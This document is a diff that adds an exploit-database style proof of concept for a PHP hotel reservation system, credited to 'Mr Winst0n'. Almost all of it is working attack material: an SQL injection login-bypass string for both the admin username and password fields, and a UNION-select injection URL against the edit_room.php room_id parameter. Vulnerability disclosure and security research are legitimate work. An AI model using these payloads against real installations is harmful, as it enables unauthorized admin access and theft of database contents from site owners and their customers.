@@ -1,0 +1,20 @@
+# Exploit Title: Simple Online Hotel Reservation System  - SQL Injection / Authentication Bypass
+# Exploit Author: Mr Winst0n
+# Author E-mail: manamtabeshekan[@]gmail[.]com
+# Discovery Date: February 25, 2019
+# Vendor Homepage: https://code-projects.org/
+# Software Link : https://code-projects.org/simple-online-hotel-reservation-system-in-php-with-source-code/
+# Tested on: Kali linux, Windows 8.1 
+
+
+# PoC:
+
+# Authentication Bypass:
+
+# Go to admin login page (http://localhost/[PATH]/admin/index.php), then use below payload as username and password => Username: ' or 1 -- -			
+			Password: ' or 1 -- -
+
+# SQL Injection:
+
+# http://localhost/[PATH]/admin/edit_room.php?room_id=4 [SQLi]
+# http://localhost/[PATH]/admin/edit_room.php?room_id=-4%27union%20select%201,2,3,4%20--%20-
